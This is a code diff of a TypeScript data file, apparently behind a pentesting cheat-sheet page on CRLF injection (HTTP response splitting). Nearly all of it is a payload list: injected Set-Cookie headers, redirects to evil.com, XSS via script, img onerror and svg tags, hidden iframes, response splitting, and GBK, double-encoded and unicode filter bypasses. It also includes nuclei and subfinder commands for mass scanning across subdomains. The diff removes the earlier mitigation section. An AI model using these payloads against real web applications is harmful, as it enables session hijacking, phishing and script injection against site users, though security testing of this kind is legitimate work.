@@ -3,251 +3,174 @@ export interface CRLFCategory {
   commands: { command: string; description: string }[]
 }
 
-export const lastUpdated = "2026-05-15"
-export const pageDescription = "CRLF injection (HTTP response splitting) testing with various headers and encoding bypasses."
+export const lastUpdated = "2026-05-28"
+export const pageDescription = "CRLF injection — HTTP header manipulation, response splitting, XSS, GBK bypass, and detection techniques."
 
 export const crlfCategories: CRLFCategory[] = [
-  // =================== INTRODUCTION ===================
   {
-    category: "Introduction",
+    category: "What is CRLF Injection?",
     commands: [
       {
-        command: "CRLF = Carriage Return (%0d) + Line Feed (%0a)",
-        description: "CRLF stands for special characters used to denote end of line in HTTP headers",
+        command: "CRLF Injection occurs when an attacker injects CR (%0d) and LF (%0a) characters into HTTP headers or responses",
+        description: "CRLF injection leads to HTTP response splitting, web cache poisoning, XSS, session fixation",
       },
       {
         command: "%0d%0aX-Injection-Test: injected",
-        description: "Basic CRLF injection test payload",
-      },
-      {
-        command: "Can lead to HTTP response splitting, web cache poisoning, and XSS attacks",
-        description: "Why CRLF Injection is dangerous",
+        description: "Basic CRLF header injection payload",
       },
     ],
   },
-
-  // =================== BASIC INJECTION ===================
   {
-    category: "Basic Header Injection",
+    category: "Real-World Payload Examples",
     commands: [
       {
         command: "%0d%0aX-Injection-Test: injected",
-        description: "Inject custom header - simplest form of CRLF",
+        description: "Inject a custom HTTP header",
       },
       {
         command: "%0d%0aSet-Cookie: hacked=true;",
-        description: "Inject a Set-Cookie header",
+        description: "Inject a malicious cookie",
       },
       {
-        command: "%0d%0a%3Ch1%3EHTML INJECTION%3C/h1%3E%0d%0a%3Cp%3ECRLF Injection PoC%3C/p%3E",
-        description: "Inject HTML content after CRLF sequence",
-      },
-    ],
-  },
-
-  // =================== REDIRECT/PHISHING ===================
-  {
-    category: "Redirect/Phishing",
-    commands: [
-      {
-        command: "%0d%0aLocation: https://evil.com",
-        description: "Redirect users to malicious site via Location header",
+        command: "%0d%0a%3Ch1%3EHTML%20INJECTION%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E",
+        description: "HTML injection via CRLF",
       },
       {
-        command: "%0d%0a%0d%0a%3Ca%20href=%22https://example.com/%22%3ELogin Here%20%3C/a%3E",
+        command: "%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A",
         description: "Phishing link injection",
       },
       {
-        command: "%0d%0aLocation: http://evil.com%0d%0aContent-Type: text/html",
-        description: "Combined redirect with content type",
+        command: "%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E",
+        description: "XSS via img onerror",
       },
-    ],
-  },
-
-  // =================== XSS INJECTION ===================
-  {
-    category: "XSS Injection via CRLF",
-    commands: [
+      {
+        command: "%0d%0aLocation:%20https://evil.com",
+        description: "Open redirect via CRLF",
+      },
       {
         command: "%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>",
-        description: "Basic XSS payload after CRLF",
+        description: "XSS via CRLF injection",
       },
       {
-        command: "%0d%0aContent-Type: text/html%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a<script>alert(document.cookie)</script>",
+        command: "%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E",
+        description: "JavaScript redirect via CRLF",
+      },
+      {
+        command: "%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
         description: "Disable XSS protection and inject script",
       },
       {
-        command: "%0d%0a%0d%0a%3Csvg onload=alert(1)%3E",
-        description: "SVG-based XSS payload",
-      },
-      {
-        command: "%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a%3Cimg src=x onerror=prompt(1)%3E",
-        description: "Bypass XSS protection with prompt()",
+        command: "%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A",
+        description: "Hidden iframe injection",
       },
     ],
   },
-
-  // =================== IFRAME INJECTION ===================
-  {
-    category: "IFrame Injection",
-    commands: [
-      {
-        command: "%0d%0a%0d%0a%3Ciframe src=%22https://www.nasa.gov/%22 style=%22border:0; position:fixed; top:0; left:0; right:0; bottom:0; width:100%; height:100%%22%3E",
-        description: "Inject hidden iframe redirecting to NASA (as example)",
-      },
-    ],
-  },
-
-  // =================== HTTP RESPONSE SPLITTING ===================
   {
     category: "HTTP Response Splitting",
     commands: [
       {
-        command: "/vulnerable-endpoint?q=abc%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('Split!')</script>",
-        description: "HTTP response splitting - create fake response",
-      },
-      {
-        command: "curl -I \"https://example.com/%0d%0aSet-Cookie:crlf=injected;\"",
-        description: "Test with curl - inject Set-Cookie header",
+        command: "/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>",
+        description: "HTTP response splitting payload",
       },
     ],
   },
-
-  // =================== BYPASS TECHNIQUES ===================
   {
-    category: "Bypass Techniques",
+    category: "GBK Encoding Bypass",
     commands: [
       {
-        command: "/%0d%0aSet-Cookie:whoami=coffinxp",
-        description: "GBK encoding bypass payload",
+        command: "/%0D%0ASet-Cookie:whoami=coffinxp",
+        description: "Basic CRLF payload (often blocked)",
       },
       {
-        command: "https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi",
-        description: "GBK-encoded CRLF bypass",
+        command: "https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp",
+        description: "GBK-encoded CRLF bypass payload",
       },
       {
-        command: "%0d%0a%0d%0a<script>alert(1);</script>",
-        description: "Double CRLF for body injection",
-      },
-      {
-        command: "%0d%0aContent-Type: text/html%0d%0aX-XSS-Protection: 0%0d%0a%0d%0a<script>alert('XSS');</script>",
-        description: "Full chain: CRLF → XSS with protection bypass",
+        command: "https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE",
+        description: "Full CRLF to XSS via GBK encoding",
       },
     ],
   },
-
-  // =================== TESTING WITH CURL ===================
   {
-    category: "Testing with cURL",
+    category: "How to Hunt for CRLF Injection",
     commands: [
       {
-        command: "curl -I \"https://example.com/%0d%0aSet-Cookie:crlf=injected;\"",
-        description: "Test single URL with curl -I (headers only)",
+        command: 'curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;"',
+        description: "Test CRLF injection with cURL",
       },
       {
-        command: "curl -I \"https://example.com/page=home%0d%0aSet-Cookie:crlf=injected;\"",
-        description: "Test with query parameter",
+        command: "nuclei -u https://target.com -t cRlf.yaml",
+        description: "Scan a single URL for CRLF",
       },
       {
-        command: "nuclei -u https://target.com -t crlf.yaml",
-        description: "Scan with Nuclei CRLF template",
-      },
-      {
-        command: "subfinder -d domain.com -all | nuclei -t crlf.yaml",
-        description: "Mass scan subdomains for CRLF vulnerabilities",
+        command: "subfinder -d domain.com -all | nuclei -t cRlf.yaml",
+        description: "Mass CRLF scan across subdomains",
       },
     ],
   },
-
-  // =================== USING LOXS TOOL ===================
   {
-    category: "Mass Scanning with Loxs",
+    category: "Complete Payload List",
     commands: [
       {
-        command: "Intercept request in Burp (e.g., GET /?page=home)",
-        description: "Step 1: Capture request with Burp Suite",
+        command: "/%%0a0aSet-Cookie:coffin=hi",
+        description: "Double-encoded CRLF payload",
       },
       {
-        command: "Send to Repeater, modify: page%0d%0aSet-Cookie:crlf=injected",
-        description: "Step 2: Inject CRLF in Repeater",
+        command: "/%0aSet-Cookie:coffin=hi;",
+        description: "LF-only cookie injection",
       },
       {
-        command: "Observe response for new headers like Set-Cookie: crlf=injected",
-        description: "Step 3: Check if injection succeeded",
+        command: "/%0d%0aLocation: http://evil.com",
+        description: "CRLF open redirect",
       },
       {
-        command: "https://github.com/coffinxp/loxs",
-        description: "Loxs tool for mass CRLF scanning",
+        command: "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
+        description: "Response splitting with XSS protection bypass",
+      },
+      {
+        command: "/%0d%0a%0d%0a<script>alert('XSS')</script>;",
+        description: "XSS via CRLF injection",
+      },
+      {
+        command: "/%0d%0aLocation: www.evil.com",
+        description: "Location header injection",
+      },
+      {
+        command: "/%0d%0aSet-Cookie:coffin=hi;",
+        description: "Set-Cookie header injection",
+      },
+      {
+        command: "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
+        description: "XSS bypass via fragment + CRLF",
+      },
+      {
+        command: "/%25%30%61Set-Cookie:coffin=hi",
+        description: "Double-encoded LF cookie injection",
+      },
+      {
+        command: "/%2e%2e%2f%0d%0aSet-Cookie:coffin=hi",
+        description: "Path traversal + CRLF injection",
+      },
+      {
+        command: "/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+        description: "Full XSS chain via query param CRLF",
+      },
+      {
+        command: "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;",
+        description: "GBK + CRLF cookie injection",
+      },
+      {
+        command: "/%E5%98%8D%E5%98%8ALocation:www.evil.com",
+        description: "GBK-encoded redirect",
+      },
+      {
+        command: "/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi",
+        description: "GBK-encoded Set-Cookie injection",
+      },
+      {
+        command: "/%u000ASet-Cookie:coffin=hi;",
+        description: "Unicode LF cookie injection",
       },
     ],
-  },
-
-  // =================== NUCLEI TEMPLATES ===================
-  {
-    category: "Nuclei Templates",
-    commands: [
-      {
-        command: "nuclei -u https://target.com -t crlf.yaml",
-        description: "Basic Nuclei CRLF scan",
-      },
-      {
-        command: "https://github.com/coffinxp/nuclei-templates/blob/main/crlf.yaml",
-        description: "Reference: CoffinXP CRLF Nuclei template",
-      },
-      {
-        command: "cat targets.txt | nuclei -t crlf.yaml -o crlf-results.txt",
-        description: "Scan list of targets and save results",
-      },
-    ],
-  },
-
-  // =================== MITIGATION ===================
-  {
-    category: "Mitigation",
-    commands: [
-      {
-        command: "Sanitize and Validate Input: Strip \\r and \\n from user input",
-        description: "Remove CR and LF characters from any user input reflected in headers",
-      },
-      {
-        command: "Use Safe Functions: Avoid manual header construction",
-        description: "Use well-tested libraries for HTTP header handling",
-      },
-      {
-        command: "Output Encoding: Encode special characters in headers",
-        description: "Properly encode user data before putting in HTTP headers",
-      },
-      {
-        command: "https://hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html",
-        description: "Reference: HackTricks CRLF Injection guide",
-      },
-      {
-        command: "https://portswigger.net/web-security/request-smuggling/response-queue-poisoning",
-        description: "Reference: PortSwigger Response Queue Poisoning",
-      },
-    ],
-  },
-]
-
-export const crlfTools = [
-  {
-    name: "Nuclei CRLF Template",
-    url: "https://github.com/coffinxp/nuclei-templates/blob/main/crlf.yaml",
-    description: "Ready-to-use Nuclei template for CRLF detection",
-  },
-  {
-    name: "Loxs Tool",
-    url: "https://github.com/coffinxp/loxs",
-    description: "Mass scanning tool for CRLF injection vulnerabilities",
-  },
-  {
-    name: "HackTricks CRLF Guide",
-    url: "https://hacktricks.wiki/en/pentesting-web/crlf-0d-0a.html",
-    description: "Comprehensive CRLF injection techniques and examples",
-  },
-  {
-    name: "PortSwigger CRLF",
-    url: "https://portswigger.net/web-security/request-smuggling/response-queue-poisoning",
-    description: "Advanced response queue poisoning techniques",
   },
 ]
